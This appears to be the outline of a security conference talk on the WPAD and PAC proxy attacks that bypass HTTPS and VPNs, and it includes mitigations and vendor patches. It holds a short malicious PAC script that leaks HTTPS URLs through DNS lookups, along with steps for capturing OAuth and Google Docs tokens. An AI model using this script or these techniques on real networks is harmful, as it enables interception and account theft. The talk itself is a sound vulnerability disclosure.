# Toxic Proxies: Bypassing HTTPS & VPNs to Compromise Your Online Identity

**Presenters:**
- Alex Chapman (@noxrnet)
- Paul Stone (@pdjstone)

## Introduction
- **Overview:** An engaging introduction to the topic.
- **Historical Context:** SSL, PAC, WPAD, sslstrip, and HSTS.
- **PAC Attack:** Bypassing HTTPS to sniff traffic, steal data, and compromise accounts.
- **VPN Attack:** Bypassing VPNs.
- **Mitigations and Fixes.**

## Rogue Access Point Attacks
- **Assumptions:** The techniques discussed assume an attacker on the local network, such as:
  - Open WiFi networks
  - Corporate networks
  - Compromised routers
- **Capabilities:** The attacker can intercept and modify non-encrypted traffic and perform local-network attacks.

### Early Web Security
- **No Encryption (1993):** Initial web traffic was unencrypted.
- **SSL (1995):** Introduced opt-in encryption with certificates to verify domain ownership.
  - **Netscape 2:** Shipped with SSL, providing some protection against passive traffic sniffing.
- **Challenges with SSL:**
  - Many websites allowed both HTTP and HTTPS connections.
  - Users often connected over HTTP first, then redirected to HTTPS.
  - Man-in-the-Middle (MITM) attacks could prevent users from reaching the HTTPS site.
- **sslstrip (2009):** A tool that removed redirects to HTTPS and served content over HTTP.
  - **Functionality:**
    - Acted as a MITM HTTP proxy.
    - Removed HTTPS redirects.
    - Rewrote HTTPS links to HTTP.
    - Fetched HTTPS-only pages and served them as HTTP.
    - Users never reached the actual HTTPS site.

### HSTS to the Rescue
- **Problem:** sslstrip broke HTTPS by ignoring it.
- **Solution:** HSTS (HTTP Strict Transport Security) forced browsers to always use HTTPS.
  - **Header:** `Strict-Transport-Security: max-age=31536000; includeSubDomains`
  - **Effect:** Removed vulnerable HTTP to HTTPS redirects.

## Proxy Auto-Config (PAC)
- **Problem:** Complex intranets required different HTTP proxies for different websites.
- **Solution:** JavaScript file to specify which proxy to use for each URL.
  - **Specification:** "Navigator Proxy Auto-Config File Format" (March 1996).

### Web Proxy Auto-Discovery Protocol (WPAD)
- **Problem:** Browser needed a proxy configuration from the network.
- **Solution:** Automatic proxy configuration via DHCP option 252 or DNS/LLMNR/NetBIOS requests.
  - **Specification:** "Web Proxy Auto-Discovery Protocol" (December 1999).

### WPAD Attacks
- **Vulnerability:** WPAD is a significant attack vector.
- **Exploits:**
  - Malicious network users can respond to WPAD requests and hijack traffic.
  - Clear-text traffic can be viewed and modified.
  - Injection of browser 0-days and sslstrip.
  - Some remote WPAD attacks are possible.

### PAC and WPAD in 2016
- **Windows Default Settings:** WPAD is enabled by default, even in Home editions.
- **Attack Scenario:** A local network attacker can instruct the browser to use a malicious proxy.
- **Current Mitigations:** HTTPS and HSTS protect many popular sites, reducing the effectiveness of sslstrip.

### PAC Script Functionality
- **Typical PAC Script:**
  ```javascript
  function FindProxyForURL(url, host) {
    if (host.indexOf('preprod.initech.corp') >= 0)
      return 'proxyB.initech.corp';
    else if (host.indexOf('initech.corp') >= 0)
      return 'proxyA.initech.corp';
    else
      return 'proxyC.initech.corp';
  }
  ```
- **PAC Functions:**
  - `alert`, `dateRange`, `dnsDomainIs`, `dnsDomainLevels`, `dnsResolve`, `isInNet`, `isPlainHostName`, `isResolvable`, `localHostOrDomainIs`, `myIpAddress`, `shExpMatch`, `timeRange`, `weekdayRange`.

### PAC DNS Leak
- **Technique:** Encode special characters in URLs to leak data over DNS.
  ```javascript
  function FindProxyForURL(url, host) {
    if (url.indexOf('https') == 0) {
      var leakUrl = (url + '.leak').replace(/[^\w]+/gi, '.');
      dnsResolve(leakUrl);
    }
    return 'DIRECT';
  }
  ```

### Summary of PAC Attack
- **Impact:** PAC files allow attacker-controlled JavaScript to see every HTTPS URL before it is requested.
- **Data Leakage:** Sensitive data can be leaked via DNS.
- **HTTPS Vulnerability:** WPAD and PAC can bypass HTTPS protections.

### Passive and Active Attacks
- **Passive Attacks:**
  - Sniff search terms, visited HTTPS pages.
- **Active Attacks:**
  - Steal sensitive data using URLs.
  - Inject content into non-HTTPS pages.
  - Use 302 redirects to leak data.
  - Block specific URLs to capture one-time auth tokens.
  - Prerender pages to load and hide content.

### Google Docs Demonstration
- **Scenario:**
  - Load `drive.google.com` via prerender.
  - Extract document IDs from image thumbnails.
  - Inject download URLs and intercept auth tokens.
  - Replay captured URLs to download documents.

### OAuth and Single Sign-On (SSO)
- **OAuth 2.0:** Underlies many SSO systems.
- **Token Exchange:** Tokens can be exchanged via 302 redirects.

### VPN Bypass
- **Scenario:**
  - Many VPN clients do not clear proxy settings obtained via WPAD.
  - Traffic is tunneled through the WPAD proxy, compromising security.

### Mitigations
1. **Disable WPAD.**
2. **Explicitly configure PAC script URL over HTTPS or from a local file.**
3. **Ensure the VPN environment requires an HTTP proxy to reach the Internet.**

### Vendor Fixes
- **Context:** Reported PAC issues to vendors on March 3, 2016.
- **Patches:**
  - OS X, iOS, and Apple TV (CVE-2016-1801).
  - Google Chrome (CVE-2016-????).
  - Android (CVE-2016-3763).
  - Firefox (CVE-2016-???).

### Conclusion
- **Summary:** Network-based attackers can inject PAC scripts to leak HTTPS URLs via DNS, deanonymize users, steal OAuth tokens, and access private data.
- **Note:** A VPN may not necessarily protect against a malicious proxy.

**Questions?**